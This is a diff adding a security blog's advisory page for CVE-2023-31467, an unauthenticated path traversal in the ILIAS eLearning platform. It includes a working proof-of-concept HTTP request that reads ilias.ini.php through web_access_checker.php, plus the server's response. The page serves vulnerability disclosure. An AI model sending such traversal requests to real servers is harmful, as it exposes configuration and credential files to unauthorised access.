@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>[Advisory - ILIAS eLearning platform] Unauthenticated access to local files via path traversal | Red vs. Blue Shell</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="[Advisory - ILIAS eLearning platform] Unauthenticated access to local files via path traversal" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Vulnerability overview The file ILIAS-7.20/Services/WebAccessChecker/web_access_checker.php can be used to access local files and get the content of them. As there is no check if the requested file is in a specific directory, any file on the servers filesystem can be accessed." />
+<meta property="og:description" content="Vulnerability overview The file ILIAS-7.20/Services/WebAccessChecker/web_access_checker.php can be used to access local files and get the content of them. As there is no check if the requested file is in a specific directory, any file on the servers filesystem can be accessed." />
+<link rel="canonical" href="/advisory/2023/02/02/ilias-path-traversal.html" />
+<meta property="og:url" content="/advisory/2023/02/02/ilias-path-traversal.html" />
+<meta property="og:site_name" content="Red vs. Blue Shell" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-02-02T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="[Advisory - ILIAS eLearning platform] Unauthenticated access to local files via path traversal" />
+<script type="application/ld+json">
+{"description":"Vulnerability overview The file ILIAS-7.20/Services/WebAccessChecker/web_access_checker.php can be used to access local files and get the content of them. As there is no check if the requested file is in a specific directory, any file on the servers filesystem can be accessed.","@type":"BlogPosting","headline":"[Advisory - ILIAS eLearning platform] Unauthenticated access to local files via path traversal","dateModified":"2023-02-02T00:00:00+00:00","datePublished":"2023-02-02T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"/advisory/2023/02/02/ilias-path-traversal.html"},"url":"/advisory/2023/02/02/ilias-path-traversal.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Red vs. Blue Shell" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Red vs. Blue Shell</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">[Advisory - ILIAS eLearning platform] Unauthenticated access to local files via path traversal</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-02-02T00:00:00+00:00" itemprop="datePublished">Feb 2, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody"><p class="advisory-details">
+
+<table>
+    <tr>
+        <th>Product:</th>
+        <th>ILIAS eLearning platform</th>
+    </tr>
+    <tr>
+        <th>Homepage:</th>
+        <th><a href="https://www.ilias.de/en/about-ilias/">https://www.ilias.de/en/about-ilias/</a></th>
+    </tr>
+
+
+    <tr>
+        <th>CVE Number:</th>
+        <th><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-31467">CVE-2023-31467</a></th>
+    </tr>
+
+
+    
+    <tr>
+        <th>Vulnerable version:</th>
+        <th><= 7.20, <= 8.1</th>
+    </tr>
+    <tr>
+        <th>Fixed version:</th>
+        <th>7.21, 8.2</th>
+    </tr>
+    <tr>
+        <th>CVSS Score:</th>
+        <th><span class="High">High 7.5</span> - <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</a>
+        </th>
+    </tr>
+    <tr>
+        <th>Found:</th><th>Feb 2, 2023</th>
+    </tr>
+</table>
+
+</p>
+
+Back to: <a href="/advisory/2023/05/24/ilias-multiple-vulnerabilities.html">[Advisory - ILIAS] Multiple vulnerabilities (LFI, Auth bypass, RCE)</a>
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="vulnerability-overview">Vulnerability overview</h1>
+<p>The file <code class="language-plaintext highlighter-rouge">ILIAS-7.20/Services/WebAccessChecker/web_access_checker.php</code> can be used to access local files and get the content of them. As there is no check if the requested file is in a specific directory, any file on the servers filesystem can be accessed.</p>
+
+<p>To initialize the <code class="language-plaintext highlighter-rouge">Delivery</code> object (<code class="language-plaintext highlighter-rouge">ILIAS-7.20/Services/FileDelivery/classes/Delivery.php</code>) the value after the script name is used.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># FILE: ILIAS-7.20/Services/WebAccessChecker/classes/class.ilWebAccessCheckerDelivery.php</span>
+<span class="k">protected</span> <span class="k">function</span> <span class="n">deliver</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ilWebAccessChecker</span><span class="o">-&gt;</span><span class="nf">isChecked</span><span class="p">())</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nc">ilWACException</span><span class="p">(</span><span class="n">ilWACException</span><span class="o">::</span><span class="no">ACCESS_WITHOUT_CHECK</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$ilFileDelivery</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Delivery</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ilWebAccessChecker</span><span class="o">-&gt;</span><span class="nf">getPathObject</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">getCleanURLdecodedPath</span><span class="p">(),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">http</span><span class="p">);</span>
+    <span class="nv">$ilFileDelivery</span><span class="o">-&gt;</span><span class="nf">setCache</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+    <span class="nv">$ilFileDelivery</span><span class="o">-&gt;</span><span class="nf">setDisposition</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ilWebAccessChecker</span><span class="o">-&gt;</span><span class="nf">getDisposition</span><span class="p">());</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">ilWebAccessChecker</span><span class="o">-&gt;</span><span class="nf">getPathObject</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">isStreamable</span><span class="p">())</span> <span class="p">{</span> <span class="c1">// fixed 0016468</span>
+        <span class="nv">$ilFileDelivery</span><span class="o">-&gt;</span><span class="nf">stream</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$ilFileDelivery</span><span class="o">-&gt;</span><span class="nf">deliver</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>For example the URL <code class="language-plaintext highlighter-rouge">http://ilias.local:9080/Services/WebAccessChecker/web_access_checker.php/data/myilias/./../../ilias.ini.php</code> uses <code class="language-plaintext highlighter-rouge">./data/myilias/./../../ilias.ini.php</code> as the parameter value for the <code class="language-plaintext highlighter-rouge">Delivery</code> object constructor.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>The following request gets the content of the file <code class="language-plaintext highlighter-rouge">ilias.ini.php</code> file.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/Services/WebAccessChecker/web_access_checker.php/data/myilias/./../../ilias.ini.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">ilias.local</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">ilClientId=myilias;</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">font</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">cors</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+
+</code></pre></div></div>
+
+<p>The response to this request contains the content of the file.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 26 Apr 2023 04:27:56 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.54 (Debian)</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/7.4.33</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">ilClientId=myilias; Path=/</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Mon, 1 May 2023 04:27:56 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">must-revalidate, post-check=0, pre-check=0</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">public</span>
+<span class="na">X-ILIAS-FileDelivery-Method</span><span class="p">:</span> <span class="s">php</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">3a5c2de0b2c55f2d7fdc8de51eaf4854</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Wed, 26 Apr 2023 04:19:02 GMT</span>
+<span class="na">Content-Disposition</span><span class="p">:</span> <span class="s">inline; filename="ilias.ini.php"</span>
+<span class="na">Content-Description</span><span class="p">:</span> <span class="s">ilias.ini.php</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1285</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-wine-extension-ini</span>
+
+; &lt;?php exit; ?&gt;
+[server]
+http_path = "http://ilias.local"
+absolute_path = "/var/www/html"
+presetting = ""
+timezone = "UTC"
+
+[clients]
+path = "data"
+inifile = "client.ini.php"
+datadir = "/var/www/files"
+default = "myilias"
+list = "0"
+
+[setup]
+pass = ""
+
+[tools]
+......
+</code></pre></div></div>
+
+
+  </div>
+
+  <a class="u-url" href="/advisory/2023/02/02/ilias-path-traversal.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p>Posts about IT Security, pentesting and bug bounty hunting.</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/stuxxn" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/stuxxn" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
